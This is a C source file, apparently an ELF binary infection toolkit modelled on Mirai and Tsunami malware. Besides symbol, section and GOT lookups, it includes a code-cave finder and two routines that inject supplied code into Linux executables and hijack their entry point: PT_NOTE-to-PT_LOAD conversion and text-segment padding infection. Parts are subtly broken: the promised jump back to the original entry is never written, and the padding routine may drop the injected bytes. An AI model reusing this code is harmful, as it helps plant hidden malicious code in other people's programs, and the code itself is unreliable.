/*
 * ELF Format - Binary parsing/infection
 * Linux.Mirai/ELF.Tsunami patterns
 */

#include <elf.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>

// ============================================================================
// ELF CONTEXT
// ============================================================================

typedef struct {
    void*       base;
    unsigned long sz;
    Elf64_Ehdr* ehdr;
    Elf64_Phdr* phdr;
    Elf64_Shdr* shdr;
    char*       shstr;
    char*       str;
    Elf64_Sym*  sym;
    int         nsym;
} ELF;

// ============================================================================
// OPEN/CLOSE
// ============================================================================

ELF* elf_open(const char* p)
{
    int fd = open(p, 0);
    if(fd < 0) return 0;

    struct stat st;
    fstat(fd, &st);

    void* m = mmap(0, st.st_size, 1, 2, fd, 0);  // PROT_READ, MAP_PRIVATE
    close(fd);

    if(m == (void*)-1) return 0;
    if(*(unsigned int*)m != 0x464C457F) {  // "\x7fELF"
        munmap(m, st.st_size);
        return 0;
    }

    static ELF e;
    e.base = m;
    e.sz = st.st_size;
    e.ehdr = m;
    e.phdr = (Elf64_Phdr*)((char*)m + e.ehdr->e_phoff);
    e.shdr = (Elf64_Shdr*)((char*)m + e.ehdr->e_shoff);
    e.shstr = (char*)m + e.shdr[e.ehdr->e_shstrndx].sh_offset;

    e.str = 0;
    e.sym = 0;
    e.nsym = 0;

    for(int i = 0; i < e.ehdr->e_shnum; i++) {
        char* n = e.shstr + e.shdr[i].sh_name;
        if(e.shdr[i].sh_type == 3) {  // SHT_STRTAB
            if(n[0]=='.' && n[1]=='s' && n[2]=='t' && n[3]=='r')
                e.str = (char*)m + e.shdr[i].sh_offset;
        }
        if(e.shdr[i].sh_type == 2) {  // SHT_SYMTAB
            e.sym = (Elf64_Sym*)((char*)m + e.shdr[i].sh_offset);
            e.nsym = e.shdr[i].sh_size / sizeof(Elf64_Sym);
        }
    }

    return &e;
}

void elf_close(ELF* e)
{
    if(e && e->base) munmap(e->base, e->sz);
}

// ============================================================================
// SYMBOL LOOKUP
// ============================================================================

unsigned long elf_sym(ELF* e, const char* name)
{
    if(!e->sym || !e->str) return 0;

    for(int i = 0; i < e->nsym; i++) {
        char* s = e->str + e->sym[i].st_name;
        const char* n = name;
        while(*s && *n && *s == *n) { s++; n++; }
        if(!*s && !*n) return e->sym[i].st_value;
    }
    return 0;
}

// ============================================================================
// SECTION LOOKUP
// ============================================================================

Elf64_Shdr* elf_sec(ELF* e, const char* name)
{
    for(int i = 0; i < e->ehdr->e_shnum; i++) {
        char* s = e->shstr + e->shdr[i].sh_name;
        const char* n = name;
        while(*s && *n && *s == *n) { s++; n++; }
        if(!*s && !*n) return &e->shdr[i];
    }
    return 0;
}

void* elf_sec_data(ELF* e, const char* name, unsigned long* sz)
{
    Elf64_Shdr* sh = elf_sec(e, name);
    if(!sh) return 0;
    *sz = sh->sh_size;
    return (char*)e->base + sh->sh_offset;
}

// ============================================================================
// CODE CAVES
// ============================================================================

typedef struct {
    unsigned long off;
    unsigned long sz;
    int           idx;
} CAVE;

int elf_caves(ELF* e, CAVE* c, int max, unsigned long min)
{
    int n = 0;
    for(int i = 0; i < e->ehdr->e_shnum - 1 && n < max; i++) {
        unsigned long end = e->shdr[i].sh_offset + e->shdr[i].sh_size;
        unsigned long nxt = e->shdr[i+1].sh_offset;
        if(nxt > end && nxt - end >= min) {
            c[n].off = end;
            c[n].sz = nxt - end;
            c[n].idx = i;
            n++;
        }
    }
    return n;
}

// ============================================================================
// PT_NOTE INJECTION
// ============================================================================

int elf_inject(const char* in, const char* out, unsigned char* code, unsigned long len)
{
    int fd = open(in, 0);
    if(fd < 0) return -1;

    struct stat st;
    fstat(fd, &st);

    void* m = mmap(0, st.st_size, 1, 2, fd, 0);
    close(fd);
    if(m == (void*)-1) return -1;

    unsigned long osz = st.st_size + len;
    char* o = mmap(0, osz, 3, 0x22, -1, 0);  // PROT_RW, ANON|PRIV
    if(o == (void*)-1) {
        munmap(m, st.st_size);
        return -1;
    }

    char* s = m;
    char* d = o;
    unsigned long n = st.st_size;
    while(n--) *d++ = *s++;

    Elf64_Ehdr* eh = (Elf64_Ehdr*)o;
    Elf64_Phdr* ph = (Elf64_Phdr*)(o + eh->e_phoff);

    for(int i = 0; i < eh->e_phnum; i++) {
        if(ph[i].p_type == 4) {  // PT_NOTE
            ph[i].p_type = 1;    // PT_LOAD
            ph[i].p_flags = 5;   // PF_R|PF_X
            ph[i].p_offset = st.st_size;
            ph[i].p_vaddr = 0xc000000 + st.st_size;
            ph[i].p_paddr = ph[i].p_vaddr;
            ph[i].p_filesz = len;
            ph[i].p_memsz = len;
            ph[i].p_align = 0x1000;

            s = (char*)code;
            d = o + st.st_size;
            n = len;
            while(n--) *d++ = *s++;

            eh->e_entry = ph[i].p_vaddr;
            break;
        }
    }

    fd = open(out, 0x41, 0755);  // O_WRONLY|O_CREAT
    if(fd >= 0) {
        write(fd, o, osz);
        close(fd);
    }

    munmap(o, osz);
    munmap(m, st.st_size);
    return 0;
}

// ============================================================================
// GOT ENTRY
// ============================================================================

unsigned long* elf_got(ELF* e, const char* func)
{
    Elf64_Shdr* rela = elf_sec(e, ".rela.plt");
    Elf64_Shdr* dsym = elf_sec(e, ".dynsym");
    Elf64_Shdr* dstr = elf_sec(e, ".dynstr");

    if(!rela || !dsym || !dstr) return 0;

    Elf64_Rela* r = (Elf64_Rela*)((char*)e->base + rela->sh_offset);
    int nr = rela->sh_size / sizeof(Elf64_Rela);

    Elf64_Sym* sym = (Elf64_Sym*)((char*)e->base + dsym->sh_offset);
    char* str = (char*)e->base + dstr->sh_offset;

    for(int i = 0; i < nr; i++) {
        int idx = r[i].r_info >> 32;
        char* s = str + sym[idx].st_name;
        const char* f = func;
        while(*s && *f && *s == *f) { s++; f++; }
        if(!*s && !*f)
            return (unsigned long*)((char*)e->base + r[i].r_offset);
    }
    return 0;
}

// ============================================================================
// SEGMENT PADDING INFECTION
// ============================================================================

int elf_pad_inject(const char* in, const char* out, unsigned char* code, unsigned long len)
{
    int fd = open(in, 0);
    if(fd < 0) return -1;

    struct stat st;
    fstat(fd, &st);

    void* m = mmap(0, st.st_size + 0x1000, 3, 2, fd, 0);  // Allow growth
    close(fd);
    if(m == (void*)-1) return -1;

    Elf64_Ehdr* eh = m;
    Elf64_Phdr* ph = (Elf64_Phdr*)((char*)m + eh->e_phoff);

    // Find text segment
    for(int i = 0; i < eh->e_phnum; i++) {
        if(ph[i].p_type == 1 && (ph[i].p_flags & 1)) {  // PT_LOAD, PF_X
            unsigned long end = ph[i].p_offset + ph[i].p_filesz;
            unsigned long pad = ph[i].p_align - (end % ph[i].p_align);

            if(pad >= len) {
                char* d = (char*)m + end;
                char* s = (char*)code;
                unsigned long n = len;
                while(n--) *d++ = *s++;

                unsigned long entry = ph[i].p_vaddr + ph[i].p_filesz;
                ph[i].p_filesz += len;
                ph[i].p_memsz += len;

                // Patch entry
                unsigned long old = eh->e_entry;
                eh->e_entry = entry;

                // First bytes should jump back
                break;
            }
        }
    }

    fd = open(out, 0x41, 0755);
    if(fd >= 0) {
        write(fd, m, st.st_size);
        close(fd);
    }

    munmap(m, st.st_size + 0x1000);
    return 0;
}

// ============================================================================
// EOF
// ============================================================================
